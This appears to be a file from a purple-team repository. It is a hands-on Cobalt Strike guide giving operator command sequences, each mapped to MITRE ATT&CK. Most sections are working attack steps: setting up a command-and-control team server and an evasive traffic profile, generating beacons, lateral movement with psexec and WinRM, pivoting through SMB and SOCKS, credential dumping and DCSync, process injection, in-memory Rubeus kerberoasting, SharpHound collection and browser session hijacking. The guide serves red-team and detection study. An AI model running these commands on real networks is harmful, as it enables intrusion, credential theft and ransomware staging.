# Cobalt Strike — Hands-On Use Cases

Every scenario below expands an entry from `01 - Overview.md`'s Quick Use-Case List, with a full command sequence and its MITRE ATT&CK ID(s). Team Server commands run on the Linux server host; everything under a `beacon>` prompt runs inside the Cobalt Strike Client console against a live session.

## Contents
- [Standing Up a Team Server with a Malleable C2 Profile](#standing-up-a-team-server-with-a-malleable-c2-profile)
- [Generating a Stageless HTTPS Beacon](#generating-a-stageless-https-beacon)
- [Generating a Staged Beacon for Size-Constrained Delivery](#generating-a-staged-beacon-for-size-constrained-delivery)
- [Standing Up a DNS Listener for Covert Beaconing](#standing-up-a-dns-listener-for-covert-beaconing)
- [Tuning Sleep and Jitter for a Low-Noise Engagement](#tuning-sleep-and-jitter-for-a-low-noise-engagement)
- [Customizing a Malleable C2 Profile for Evasion](#customizing-a-malleable-c2-profile-for-evasion)
- [Lateral Movement via jump psexec](#lateral-movement-via-jump-psexec)
- [Lateral Movement via jump winrm](#lateral-movement-via-jump-winrm)
- [Pivoting Internal Hosts with No Direct Egress](#pivoting-internal-hosts-with-no-direct-egress)
- [Standing Up a SOCKS Proxy for Tool-Agnostic Pivoting](#standing-up-a-socks-proxy-for-tool-agnostic-pivoting)
- [Credential Harvesting via the Bundled Mimikatz Integration](#credential-harvesting-via-the-bundled-mimikatz-integration)
- [Process Injection and Migration](#process-injection-and-migration)
- [Running In-Memory .NET Tradecraft via execute-assembly](#running-in-memory-net-tradecraft-via-execute-assembly)
- [Browser Pivoting to Inherit an Authenticated Session](#browser-pivoting-to-inherit-an-authenticated-session)
- [Chained Workflow: Beacon Into AD Recon Tooling](#chained-workflow-beacon-into-ad-recon-tooling)
- [Illegitimate/Cracked-License Use as a Ransomware Precursor](#illegitimatecracked-license-use-as-a-ransomware-precursor)

---

## Standing Up a Team Server with a Malleable C2 Profile

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol: Web Protocols) — infrastructure setup for the technique, not an execution step itself.

```bash
# On the Linux Team Server host, from the Cobalt Strike install directory
sudo ./teamserver 203.0.113.10 Sup3rS3cr3tOperatorPW /opt/profiles/jquery-c2.4.profile 2026-09-30

# Validate a profile's syntax before loading it (catches malformed blocks early)
./c2lint /opt/profiles/jquery-c2.4.profile
```

`<host>` and `<password>` are mandatory; the profile and Kill Date are optional but a profile is required if a Kill Date is set (`01 - Overview.md`). `c2lint` is Fortra's own profile-validation utility — run it before every new profile deployment, since a malformed profile fails the Team Server startup.

## Generating a Stageless HTTPS Beacon

**MITRE ATT&CK:** T1071.001, T1105 (Ingress Tool Transfer)

From the Client console: `Attacks → Packages → Windows Executable (S)`, or via the scripted equivalent an operator would issue against the Team Server's payload-generation API. Key operator-facing choices:

- Listener: an HTTPS listener already configured (`Cobalt Strike → Listeners → Add`, `https`, port 443)
- Output: `Windows EXE`, architecture `x64`
- **Stageless** checkbox selected — the full Beacon backdoor, config included, ships in one binary; no separate stage download occurs at runtime

## Generating a Staged Beacon for Size-Constrained Delivery

**MITRE ATT&CK:** T1105

```
# Client console (GUI equivalent):
Attacks → Packages → Windows Executable (S) → uncheck "Stageless"
# Produces a small stager that, on execution, requests the full Beacon
# from the Team Server's http-stager transaction (01 - Overview.md):
#   GET /<4-char-alphanumeric-checksum8-URI> HTTP/1.1
```

Useful where delivery bandwidth/size is constrained (macro-embedded stagers, small shellcode injected via an existing exploit chain). Set `host_stage false` in the Malleable profile if the operator wants to disable the Team Server's default behavior of serving that stage to any syntactically valid checksummed request — otherwise a defender who guesses/brute-forces a valid URI can pull the stage without ever compromising a host.

## Standing Up a DNS Listener for Covert Beaconing

**MITRE ATT&CK:** T1071.004 (Application Layer Protocol: DNS), T1572 (Protocol Tunneling)

```
# Client console:
Cobalt Strike → Listeners → Add
  Payload: Beacon DNS
  DNS Hosts: c2.example-cdn.net
  (Hybrid DNS+HTTP is the default mode — DNS carries the beacon
   channel, HTTP carries the bulk-data channel)
```

Requires the operator to control `example-cdn.net`'s NS delegation so resolution actually reaches the Team Server. Useful in environments with tightly filtered HTTP(S)/direct-TCP egress but permissive internal DNS resolution to the internet.

## Tuning Sleep and Jitter for a Low-Noise Engagement

**No discrete MITRE ATT&CK ID** — this is operational/OPSEC tuning of an existing C2 channel rather than a distinct technique; it modifies how T1071.001/T1071.004 traffic is timed, not what protocol carries it.

```
beacon> sleep 300 40
# 300 seconds base interval, 40% jitter -> effective check-ins
# randomize between 180 and 300 seconds
```

Longer sleep windows reduce network footprint at the cost of operator interactivity — queued tasking only executes on the beacon's next check-in.

## Customizing a Malleable C2 Profile for Evasion

**MITRE ATT&CK:** T1001.003 (Data Obfuscation: Protocol Impersonation), T1090.001 (Proxy: Internal Proxy — where profile-shaped traffic routes through redirectors), T1027.005 (Obfuscated Files or Information: Indicator Removal from Tools)

```
# Excerpt of a profile disguising Beacon as jQuery CDN traffic (01 - Overview.md)
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/jquery-3.3.1.min.js";
    client { header "Accept" "*/*"; }
}

# Reload against the Team Server (requires restart + payload regeneration):
sudo ./teamserver 203.0.113.10 Sup3rS3cr3tOperatorPW /opt/profiles/jquery-c2.4.profile
```

Applying a new profile is not a hot-swap — the Team Server must restart and any already-generated Beacons continue running their old configuration until reissued.

## Lateral Movement via jump psexec

**MITRE ATT&CK:** T1569.002 (System Services: Service Execution), T1021.002 (Remote Services: SMB/Windows Admin Shares)

```
beacon> jump psexec64 TARGET-HOST01 https-listener
```

Drops and starts a Service EXE artifact on the target via SMB/ADMIN$ and the Service Control Manager, then catches the resulting callback on the named listener — the noisiest and most classic of the `jump` methods (service install events, per `04 - Target Evidence.md`).

## Lateral Movement via jump winrm

**MITRE ATT&CK:** T1021.006 (Remote Services: Windows Remote Management)

```
beacon> jump winrm64 TARGET-HOST02 https-listener
```

Runs a PowerShell one-liner over WinRM (default TCP 5985) rather than creating a Windows service — quieter than `psexec` from a service-event-log perspective, but generates its own WinRM/PowerShell operational-log trail (`04 - Target Evidence.md`).

## Pivoting Internal Hosts with No Direct Egress

**MITRE ATT&CK:** T1090.001 (Proxy: Internal Proxy), T1572 (Protocol Tunneling)

```
# On the already-compromised pivot host's Beacon, start an SMB bind listener:
beacon> listener add smb-pivot smb

# Deploy a second Beacon onto the internal-only host, configured to
# connect back through the pivot host's named pipe rather than direct egress:
beacon> jump psexec64 INTERNAL-ONLY-HOST smb-pivot

# From the operator's session on the pivot host, link the chained Beacon:
beacon> link INTERNAL-ONLY-HOST \\.\pipe\msagent_ab12
```

The internal-only host's Beacon traffic never leaves the internal network directly — its external network signature is identical to the pivot host's own C2 traffic, a real gap for network-only detection (`05 - Detection and Hunting.md`).

## Standing Up a SOCKS Proxy for Tool-Agnostic Pivoting

**MITRE ATT&CK:** T1090.001, T1572

```
beacon> socks 1080 socks5 disableNoAuth operator P@ssw0rd! enableLogging
```

Any operator tool that supports a SOCKS proxy (browser, `proxychains`-wrapped scanners, RDP clients) can now route traffic through the compromised host without needing a Beacon-native command for every action — useful for interactive/GUI post-exploitation the built-in command set doesn't cover.

## Credential Harvesting via the Bundled Mimikatz Integration

**MITRE ATT&CK:** T1003.001 (OS Credential Dumping: LSASS Memory), T1003.002 (OS Credential Dumping: Security Account Manager), T1003.006 (OS Credential Dumping: DCSync)

```
beacon> logonpasswords
beacon> hashdump
beacon> mimikatz !sekurlsa::ekeys
beacon> dcsync CORP.LOCAL DA-user
```

`logonpasswords`/`mimikatz` spawn a temporary sacrificial process (subject to the same `spawnto`/injection artifacts documented in `01 - Overview.md`) to run Mimikatz against LSASS; `hashdump` reads local SAM hashes without the LSASS-access step. Results land in the Team Server's credentials data model (`View → Credentials`). Shared mechanics with standalone Mimikatz are covered in depth in `Mimikatz/sekurlsa (Credential Dumping)/` — cross-link there rather than re-deriving LSASS-access mechanics.

## Process Injection and Migration

**MITRE ATT&CK:** T1055 (Process Injection), T1055.012 (Process Hollowing, where applicable to a given loader)

```
beacon> spawnto x64 C:\Windows\System32\dllhost.exe
beacon> spawn x64 https-listener
beacon> inject 4821 x64 https-listener
```

`spawnto` sets the sacrificial process for *future* temporary jobs; `spawn` starts a brand-new Beacon in a fresh sacrificial process; `inject` targets an already-running PID directly — each uses the default `VirtualAllocEx`/`WriteProcessMemory` primitive unless a custom UDRL is in play (`01 - Overview.md`).

## Running In-Memory .NET Tradecraft via execute-assembly

**MITRE ATT&CK:** T1620 (Reflective Code Loading)

```
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:C:\Windows\Temp\roast.txt
beacon> execute-assembly /opt/tools/Seatbelt.exe -group=all
```

Spawns a sacrificial process and injects/executes the .NET assembly in memory — no assembly ever touches the target's disk. Subject to AMSI scanning if AMSI is active on the target and not separately bypassed. Rubeus itself is covered in this repo's Wave 2 build (planned, not yet published); Seatbelt is already covered in `Seatbelt/`.

## Browser Pivoting to Inherit an Authenticated Session

**MITRE ATT&CK:** T1185 (Browser Session Hijacking)

```
beacon> browserpivot 4392 x64
```

Injects into a running browser process and stands up a local proxy the operator can point their own browser at — inherited cookies/session state let the operator browse internal web apps as the already-logged-in user, without ever needing the user's actual credentials.

## Chained Workflow: Beacon Into AD Recon Tooling

**MITRE ATT&CK:** T1087.002 (Account Discovery: Domain Account), T1069.002 (Permission Groups Discovery: Domain Groups) — via the chained tool's own technique set

```
beacon> execute-assembly /opt/tools/SharpHound.exe -c All -d corp.local
beacon> download C:\Windows\Temp\20260803_corp_BloodHound.zip
```

Collecting AD attack-path data in-memory through an established Beacon rather than staging SharpHound separately — see `BloodHound/SharpHound/` for the collector's own artifact/output-format detail, not re-derived here. A comparable chained pattern applies to Rubeus for Kerberos-ticket operations once that tool's own folder lands in this repo's Wave 2 build.

## Illegitimate/Cracked-License Use as a Ransomware Precursor

**MITRE ATT&CK:** T1588.002 (Obtain Capabilities: Tool) — the acquisition step; downstream tactics follow whatever the operator does with the resulting Beacon (commonly T1082/T1018 discovery, T1021.002 lateral movement, T1486 ransomware deployment)

No single command illustrates this — it's a sourcing/threat-context scenario rather than an operator workflow: per CISA's #StopRansomware joint advisories, **Play** ransomware actors deploy Cobalt Strike (often alongside AdFind for AD recon and PsExec for lateral movement) as C2 during the intrusion, and **BlackSuit (Royal)** actors "repurpose legitimate cyber penetration testing tools such as Cobalt Strike" for exfiltration staging. In both cases the Beacon in play is very likely a **cracked/leaked copy** rather than a screened-customer license, given Fortra's vetting process for legitimate sales — see `01 - Overview.md`'s watermarking discussion and Google Cloud's identification of 34 distinct cracked release families circulating publicly. This is the sourcing context for this repo's Wave 2 build (see `Purple Teaming/IDEAS.md`) and the reason Cobalt Strike coverage matters to defenders regardless of whether their own organization runs it legitimately.
